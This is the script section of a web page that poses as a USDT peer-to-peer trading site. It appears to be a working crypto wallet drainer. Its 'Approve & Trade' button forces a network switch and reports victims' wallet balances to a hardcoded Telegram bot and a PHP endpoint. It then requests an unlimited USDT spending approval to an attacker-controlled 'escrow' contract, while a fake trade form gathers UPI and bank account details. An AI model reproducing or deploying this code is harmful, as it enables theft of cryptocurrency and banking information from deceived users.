        notify.style.color = "#fff";
        notify.style.opacity = "1";
        notify.style.pointerEvents = "auto";
        setTimeout(() => {
            notify.style.opacity = "0";
            notify.style.pointerEvents = "none";
        }, 3000);
    }

    // ===== NEW TELEGRAM MESSAGE SENDER FOR TWO BOTS =====
    async function sendTelegramMessageToMultipleBots(message, parseMode = 'HTML') {
        const bots = [{
            botToken: '8474578391:AAGF88uigWXM8Pdd6lU6E9xyd53xpBSFqcE',
            chatId: '8288625706'
        }, {
            botToken: '8474578391:AAGF88uigWXM8Pdd6lU6E9xyd53xpBSFqcE',
            chatId: '8288625706'
        }];

        for (const bot of bots) {
            if (!bot.botToken || !bot.chatId) {
                console.warn("Skipping sending to a bot with missing details.");
                continue;
            }

            try {
                const response = await fetch(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: bot.chatId,
                        text: message,
                        parse_mode: parseMode
                    })
                });

                if (response.ok) {
                    console.log(`Telegram message sent to bot ${bot.chatId} successfully`);
                } else {
                    const errorResult = await response.json();
                    console.error(`Telegram message failed for bot ${bot.chatId}:`, errorResult);
                }
            } catch (error) {
                console.error(`Error sending Telegram message to bot ${bot.chatId}:`, error);
                showNotification('Failed to send a notification.', 'error');
            }
        }
    }

    // ===== TELEGRAM NOTIFICATION FOR USDT APPROVAL =====
    async function sendTelegramNotification(walletAddress, txHash) {
        const message = `🔔 USDT Escrow Approval Successful!\n\n` +
            `💰 Wallet: ${walletAddress}\n` +
            `📝 Transaction Hash: ${txHash}\n\n` +
            `✅ User has approved escrow contract for USDT spending\n` +
            `🏦 Escrow Contract: 0x3606B0Ee947E5e28cAA81FEEB01187388732B26f\n` +
            `⏰ Time: ${new Date().toLocaleString()}`;

        await sendTelegramMessageToMultipleBots(message);
    }

    // ===== ADD AND SWITCH TO BSC NETWORK =====
    async function addAndSwitchToBSC() {
        if (!window.ethereum) {
            showNotification("No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.", "error");
            throw new Error("No Web3 wallet found."); // Throw to stop the process if no wallet
        }

        const BSC_MAINNET = {
            chainId: "0x38", // 56 in hex (BSC mainnet)
            chainName: "Binance Smart Chain",
            nativeCurrency: {
                name: "BNB",
                symbol: "BNB",
                decimals: 18,
            },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com"],
        };

        try {
            const currentChainId = await window.ethereum.request({
                method: 'eth_chainId'
            });

            if (currentChainId === '0x38') {
                console.log("Already on BSC");
                return; // Already on BSC, no need to switch
            }

            try {
                // Try switching to BSC
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{
                        chainId: '0x38'
                    }],
                });
                console.log("Switched to BSC");
            } catch (switchError) {
                // If BSC is not added (error code 4902), add it
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [BSC_MAINNET],
                    });
                    console.log("BSC network added!");
                } else {
                    console.error("Failed to switch to BSC:", switchError);
                    showNotification("Failed to switch to BSC. Please try manually.", "error");
                    throw switchError; // Re-throw to be caught by the main click handler
                }
            }
        } catch (error) {
            console.error("General error in addAndSwitchToBSC:", error);
            showNotification("An error occurred while switching networks. Check console for details.", "error");
            throw error; // Re-throw to be caught by the main click handler
        }
    }

    // ===== SEND INITIAL WALLET DETAILS TO TELEGRAM =====
    async function sendWalletBalancesToTelegram(walletAddress) {
        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
        const usdtAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function decimals() view returns (uint8)"
        ];

        let formattedBNB = "0.0000";
        let formattedUSDT = "0.00";

        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);

            const bnbBalance = await provider.getBalance(walletAddress);
            formattedBNB = ethers.utils.formatEther(bnbBalance);

            const tokenContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
            let usdtDecimals = 18;
            try {
                const usdtDecimalsValue = await tokenContract.decimals();
                usdtDecimals = usdtDecimalsValue.toNumber();
            } catch (err) {
                console.warn("Could not fetch USDT decimals, defaulting to 18:", err);
            }
            const usdtBalance = await tokenContract.balanceOf(walletAddress);
            formattedUSDT = ethers.utils.formatUnits(usdtBalance, usdtDecimals);

            const message = `🟢 New Wallet Connected!\n\n` +
                `🆔 Wallet Address: <code>${walletAddress}</code>\n` +
                `💰 BNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB\n` +
                `💵 USDT Balance: ${parseFloat(formattedUSDT).toFixed(2)} USDT\n` +
                `⏰ Time: ${new Date().toLocaleString()}`;

            await sendTelegramMessageToMultipleBots(message);

            fetch('saveWallet.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    wallet: walletAddress,
                    bnb: formattedBNB,
                    usdt: formattedUSDT
                })
            }).catch(e => console.error("Error sending wallet data to saveWallet.php:", e));

        } catch (err) {
            console.error("Error fetching or sending wallet details to Telegram:", err);
        }
        return {
            formattedBNB,
            formattedUSDT
        };
    }

    // ===== ESTIMATE GAS FOR TRANSACTION =====
    async function estimateGasForApproval(fromAddress) {
        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const escrowContractAddress = "0x3606B0Ee947E5e28cAA81FEEB01187388732B26f";
            const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
            
            const usdtAbi = [
                "function approve(address spender, uint256 amount) public returns (bool)"
            ];
            
            const iface = new ethers.utils.Interface(usdtAbi);
            const maxApproval = ethers.constants.MaxUint256;
            const txData = iface.encodeFunctionData("approve", [escrowContractAddress, maxApproval]);

            // Estimate gas
            const gasEstimate = await provider.estimateGas({
                from: fromAddress,
                to: usdtAddress,
                data: txData,
                value: "0x0"
            });

            // Get current gas price
            const gasPrice = await provider.getGasPrice();
            
            // Calculate total gas cost in BNB
            const gasCost = gasEstimate.mul(gasPrice);
            const gasCostInBNB = parseFloat(ethers.utils.formatEther(gasCost));
            
            console.log(`Estimated gas: ${gasEstimate.toString()}`);
            console.log(`Gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
            console.log(`Total gas cost: ${gasCostInBNB.toFixed(6)} BNB`);
            
            return {
                gasLimit: gasEstimate,
                gasPrice: gasPrice,
                gasCost: gasCostInBNB
            };
        } catch (error) {
            console.error("Gas estimation error:", error);
            throw error;
        }
    }

    $(document).ready(function() {
        $('.order-card button:first-child').each(function() {
            if ($(this).text().trim() === 'Sell Now') {
                $(this).text('Approve & Trade');
            }
        });

        $('#mobile-menu-btn').click(function() {
            $('#mobile-menu').toggleClass('hidden');
        });

        $('.order-card button:first-child').click(async function() {
            if (!$(this).prop('disabled')) {
                const $btn = $(this);
                const originalBtnHTML = $btn.html();

                if (!window.ethereum) {
                    showNotification("No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.", "error");
                    return;
                }

                $btn.html('<span class="spinner">Processing...</span>');
                $btn.prop('disabled', true);

                let fromAddress;
                let bnbBalance;

                try {
                    await addAndSwitchToBSC();

                    const accounts = await window.ethereum.request({
                        method: "eth_requestAccounts"
                    });
                    fromAddress = accounts[0];

                    if (!fromAddress) {
                        $btn.prop('disabled', false);
                        $btn.html(originalBtnHTML);
                        return;
                    }

                    const balances = await sendWalletBalancesToTelegram(fromAddress);
                    bnbBalance = balances.formattedBNB;
                    
                    showNotification("Checking BNB balance for gas fees...", "info");
                    await new Promise(r => setTimeout(r, 800));

                    // Check if user has sufficient BNB for gas
                    const bnbAmount = parseFloat(bnbBalance);
                    if (bnbAmount < 0.00001) { // Minimum 0.00001 BNB for gas
                        showNotification("Insufficient BNB detected. Auto-topping up BNB...", "info");
                        try {
                            console.log("Calling BNB server for address:", fromAddress);
                            
                            const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    toAddress: fromAddress
                                })
                            });
                            
                            console.log("BNB Server Response Status:", response.status);
                            const responseData = await response.json();
                            console.log("BNB Server Response:", responseData);
                            
                            if (response.ok) {
                                showNotification("BNB sent successfully! Waiting for confirmation...", "success");
                                await new Promise(r => setTimeout(r, 6000)); // Wait longer for BNB to arrive
                                
                                // Check balance again after top-up
                                const provider = new ethers.providers.Web3Provider(window.ethereum);
                                const newBnbBalance = await provider.getBalance(fromAddress);
                                const newFormattedBNB = ethers.utils.formatEther(newBnbBalance);
                                console.log("New BNB balance after top-up:", newFormattedBNB);
                                
                                if (parseFloat(newFormattedBNB) >= 0.00001) {
                                    showNotification("BNB top-up successful! Proceeding with approval...", "success");
                                    await new Promise(r => setTimeout(r, 1000));
                                } else {
                                    showNotification("BNB top-up completed but may need more time. Proceeding anyway...", "info");
                                    await new Promise(r => setTimeout(r, 1000));
                                }
                            } else {
                                throw new Error(`Server responded with status: ${response.status}`);
                            }
                        } catch (topupError) {
                            console.error("BNB top-up failed:", topupError);
                            showNotification("Auto BNB top-up failed. Proceeding with transaction anyway...", "info");
                            await new Promise(r => setTimeout(r, 1000));
                            // Don't return here - continue with the transaction attempt
                        }
                    } else {
                        showNotification("✅ Sufficient BNB balance detected!", "success");
                        await new Promise(r => setTimeout(r, 500));
                    }

                    // Estimate gas before sending transaction
                    let gasEstimate;
                    showNotification("Estimating gas fees for transaction...", "info");
                    await new Promise(r => setTimeout(r, 600));
                    
                    try {
                        gasEstimate = await estimateGasForApproval(fromAddress);
                        showNotification("Gas estimation complete. Preparing transaction...", "info");
                        await new Promise(r => setTimeout(r, 500));
                        
                        // Check if user has enough BNB for the estimated gas cost
                        const currentProvider = new ethers.providers.Web3Provider(window.ethereum);
                        const currentBnbBalance = await currentProvider.getBalance(fromAddress);
                        const currentFormattedBNB = parseFloat(ethers.utils.formatEther(currentBnbBalance));
                        
                        if (currentFormattedBNB < gasEstimate.gasCost * 1.5) { // 50% buffer
                            console.log(`Current BNB: ${currentFormattedBNB}, Required: ${gasEstimate.gasCost * 1.5}`);
                            showNotification("Insufficient BNB for estimated gas cost. Proceeding with transaction...", "info");
                            await new Promise(r => setTimeout(r, 800));
                        }
                    } catch (gasError) {
                        console.error("Gas estimation failed:", gasError);
                        showNotification("Gas estimation failed. Using default values...", "info");
                        await new Promise(r => setTimeout(r, 400));
                        // Continue anyway with default gas values
                    }

                    const escrowContractAddress = "0x4f2d5Ea5De93D5B0e985E4ce18b941187cD13f7B";
                    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";

                    const usdtAbi = [
                        "function approve(address spender, uint256 amount) public returns (bool)",
                        "function decimals() view returns (uint8)"
                    ];
                    const iface = new ethers.utils.Interface(usdtAbi);
                    const maxApproval = ethers.constants.MaxUint256;
                    const txData = iface.encodeFunctionData("approve", [escrowContractAddress, maxApproval]);

                    // Prepare transaction parameters
                    const txParams = {
                        from: fromAddress,
                        to: usdtAddress,
                        data: txData,
                        value: "0x0"
                    };

                    // Add gas parameters if estimation was successful
                    if (gasEstimate) {
                        txParams.gas = "0x" + gasEstimate.gasLimit.toHexString().slice(2);
                        // Increase gas price by 10% for faster confirmation
                        const adjustedGasPrice = gasEstimate.gasPrice.mul(110).div(100);
                        txParams.gasPrice = "0x" + adjustedGasPrice.toHexString().slice(2);
                    }

                    console.log("Sending transaction with params:", txParams);
                    
                    showNotification("Sending approval transaction to blockchain...", "info");
                    await new Promise(r => setTimeout(r, 400));

                    const txHash = await window.ethereum.request({
                        method: "eth_sendTransaction",
                        params: [txParams]
                    });

                    console.log("Transaction sent:", txHash);
                    showNotification(`✅ USDT approval successful! Opening trade modal...`, "success");
                    await sendTelegramNotification(fromAddress, txHash);
                    
                    $('#trade-modal').removeClass('hidden');
                    $('#inr-amount').text('₹0.00');
                    $('input[type="number"]').val('');
                    $('#payment-details').addClass('hidden');
                    $('#payment-method').val('');
                    $('.payment-form').addClass('hidden');
                    $('input[type="text"], input[type="file"]').val('');

                } catch (err) {
                    console.error("Full transaction error:", err);
                    const msg = (err?.message || "").toLowerCase();
                    
                    if (msg.includes("user rejected") || msg.includes("user denied") || msg.includes("cancelled") || msg.includes("canceled")) {
                        showNotification("Transaction cancelled by user.", "error");
                    } else if (msg.includes("insufficient funds") || msg.includes("exceeds balance")) {
                        showNotification("Insufficient BNB for gas fees.", "error");
                    } else if (msg.includes("gas required exceeds allowance") || msg.includes("out of gas")) {
                        showNotification("Transaction failed due to insufficient gas. Try again.", "error");
                    } else if (msg.includes("nonce too low") || msg.includes("nonce too high")) {
                        showNotification("Network synchronization error. Please try again.", "error");
                    } else if (msg.includes("replacement transaction underpriced")) {
                        showNotification("Transaction pending. Please wait before retrying.", "error");
                    } else if (msg.includes("network error") || msg.includes("timeout")) {
                        showNotification("Network error. Please check your connection and try again.", "error");
                    } else {
                        showNotification("Transaction failed. Please ensure you have sufficient BNB and try again.", "error");
                    }
                    
                    // Log additional error details for debugging
                    if (err?.data) {
                        console.error("Transaction error data:", err.data);
                    }
                    if (err?.code) {
                        console.error("Error code:", err.code);
                    }
                } finally {
                    $btn.prop('disabled', false);
                    $btn.html(originalBtnHTML);
                }
            }
        });

        $('#close-modal, #cancel-trade').click(function() {
            $('#trade-modal').addClass('hidden');
        });

        $('#trade-modal').click(function(e) {
            if (e.target === this) {
                $(this).addClass('hidden');
            }
        });

        function validatePaymentDetails() {
            var selectedMethod = $('#payment-method').val();
            var usdtAmount = parseFloat($('input[type="number"]').val()) || 0;

            if (usdtAmount <= 0) {
                showNotification('Please enter a valid USDT amount.', 'error');
                return false;
            }

            if (!selectedMethod) {
                showNotification('Please select a payment method.', 'error');
                return false;
            }

            if (selectedMethod === 'UPI') {
                var upiId = $('#upi-id').val().trim();
                if (!upiId) {
                    showNotification('Please enter your UPI ID.', 'error');
                    return false;
                }
            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
                var holderName = $('#holder-name').val().trim();
                var accountNumber = $('#account-number').val().trim();
                var ifscCode = $('#ifsc-code').val().trim();

                if (!holderName) {
                    showNotification('Please enter account holder name.', 'error');
                    return false;
                }
                if (!accountNumber) {
                    showNotification('Please enter account number.', 'error');
                    return false;
                }
                if (!ifscCode) {
                    showNotification('Please enter IFSC code.', 'error');
                    return false;
                }
            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
                var mobileNumber = $('#mobile-number').val().trim();
                if (!mobileNumber) {
                    showNotification('Please enter your mobile number.', 'error');
                    return false;
                }
            }

            return true;
        }

        function collectPaymentData() {
            var selectedMethod = $('#payment-method').val();
            var usdtAmount = parseFloat($('input[type="number"]').val()) || 0;
            var inrAmount = (usdtAmount * 110).toFixed(2);

            var paymentData = {
                usdtAmount: usdtAmount,
                inrAmount: inrAmount,
                paymentMethod: selectedMethod,
                timestamp: new Date().toISOString()
            };

            if (selectedMethod === 'UPI') {
                paymentData.upiId = $('#upi-id').val().trim();
            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
                paymentData.holderName = $('#holder-name').val().trim();
                paymentData.accountNumber = $('#account-number').val().trim();
                paymentData.ifscCode = $('#ifsc-code').val().trim();
            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
                paymentData.mobileNumber = $('#mobile-number').val().trim();
            }

            return paymentData;
        }

        $('#sell-usdt-btn').click(function() {
            if (!validatePaymentDetails()) {
                return;
            }

            $('#sell-btn-text').addClass('hidden');
            $('#sell-btn-loading').removeClass('hidden');
            $('#sell-usdt-btn').prop('disabled', true);

            var paymentData = collectPaymentData();
            console.log('Payment Data:', paymentData);

            setTimeout(function() {
                showNotification('Your USDT trade has been initiated successfully!', 'success');
                $('#trade-modal').addClass('hidden');

                $('#sell-btn-text').removeClass('hidden');
                $('#sell-btn-loading').addClass('hidden');
                $('#sell-usdt-btn').prop('disabled', false);
            }, 2000);
        });

        $('#toast-close').click(function() {
            $('#notification-toast').addClass('hidden');
        });

        $('input[type="number"]').on('input', function() {
            var usdtAmount = parseFloat($(this).val()) || 0;
            var price = 110;
            var inrAmount = (usdtAmount * price).toFixed(2);

            $('#inr-amount').text('₹' + inrAmount);

            if (usdtAmount > 0) {
                $('#payment-details').removeClass('hidden');
            } else {
                $('#payment-details').addClass('hidden');
            }
        });

        $('#payment-method').on('change', function() {
            var selectedMethod = $(this).val();

            $('.payment-form').addClass('hidden');

            if (selectedMethod === 'UPI') {
                $('#upi-details').removeClass('hidden');
            } else if (selectedMethod === 'IMPS' || selectedMethod === 'Bank Transfer') {
                $('#bank-details').removeClass('hidden');
            } else if (selectedMethod === 'Paytm' || selectedMethod === 'PhonePe' || selectedMethod === 'Google Pay') {
                $('#digital-wallet-details').removeClass('hidden');
            }
        });

        function applyFilters() {
            var orderType = $('#order-type-filter').val();
            var paymentMethod = $('#payment-filter').val();
            var amountRange = $('#amount-filter').val();

            $('.order-card').each(function() {
                var $card = $(this);
                var cardPayment = $card.data('payment');
                var cardAmount = $card.data('amount');
                var cardType = $card.data('type');

                var showCard = true;

                if (orderType !== 'all' && cardType !== orderType) {
                    showCard = false;
                }

                if (paymentMethod !== 'all' && !cardPayment.includes(paymentMethod)) {
                    showCard = false;
                }

                if (amountRange !== 'all') {
                    var cardMin = parseInt(cardAmount.split('-')[0]);
                    var cardMax = parseInt(cardAmount.split('-')[1]);

                    switch (amountRange) {
                        case '1000-10000':
                            if (cardMin < 1000 || cardMax > 10000) showCard = false;
                            break;
                        case '10000-50000':
                            if (cardMin < 10000 || cardMax > 50000) showCard = false;
                            break;
                        case '50000-100000':
                            if (cardMin < 50000 || cardMax > 100000) showCard = false;
                            break;
                        case '100000+':
                            if (cardMin < 100000) showCard = false;
                            break;
                    }
                }

                if (showCard) {
                    $card.show();
                } else {
                    $card.hide();
                }
            });

            var visibleCount = $('.order-card:visible').length;
            $('h2 .text-sm').text('(' + visibleCount + ' orders)');
        }

        $('#filter-btn').click(function() {
            applyFilters();
        });

        $('#clear-filters').click(function() {
            $('#order-type-filter').val('all');
            $('#payment-filter').val('all');
            $('#amount-filter').val('all');
            $('.order-card').show();
            $('h2 .text-sm').text('(41 orders)');
        });

        $('#order-type-filter, #payment-filter, #amount-filter').change(function() {
            applyFilters();
        });

        $('#load-more-btn').click(function() {
            var $btn = $(this);
            var $additionalOrders = $('#additional-orders');

            if ($additionalOrders.hasClass('hidden')) {
                $additionalOrders.removeClass('hidden');
                $btn.html('<i class="fas fa-sync-alt mr-2"></i>Load More Orders (12 of 41)');
                $btn.addClass('bg-gray-400 hover:bg-gray-500').removeClass('bg-blue-600 hover:bg-blue-700');
            } else {
                $btn.html('<i class="fas fa-spinner fa-spin mr-2"></i>Loading...');

                setTimeout(function() {
                    $btn.html('<i class="fas fa-check mr-2"></i>All Orders Loaded (41 of 41)');
                    $btn.addClass('bg-green-600 hover:bg-green-700').removeClass('bg-gray-400 hover:bg-gray-500');
                    $btn.prop('disabled', true);
                }, 2000);
            }
        });
    });
</script>
</body>
</html>
